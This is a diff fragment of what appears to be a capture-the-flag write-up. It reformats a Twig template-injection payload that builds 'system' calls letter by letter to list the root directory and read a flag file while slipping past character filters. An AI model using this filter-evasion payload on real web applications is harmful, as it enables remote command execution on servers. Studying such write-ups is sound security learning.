@@ -299,7 +299,8 @@ My final payload looks like:
 {% set slash = endl|join|nl2br|slice(4,1) %}
 
 {{ {s:l~s~space~slash}|find(s~y~s~t~e~m) }}
-{% set flag = c~a~t~space~slash~f~l~a~g~hyphen~e~d~b~f~c~b~c~a~e~f %}{{ {s:flag}|find(s~y~s~t~e~m) }}
+{% set flag = c~a~t~space~slash~f~l~a~g~hyphen~e~d~b~f~c~b~c~a~e~f %}
+{{ {s:flag}|find(s~y~s~t~e~m) }}
 ```
 
 First, we create variables for different letters. Then, we also create four more variables for space, hyphen, newline, and slash.
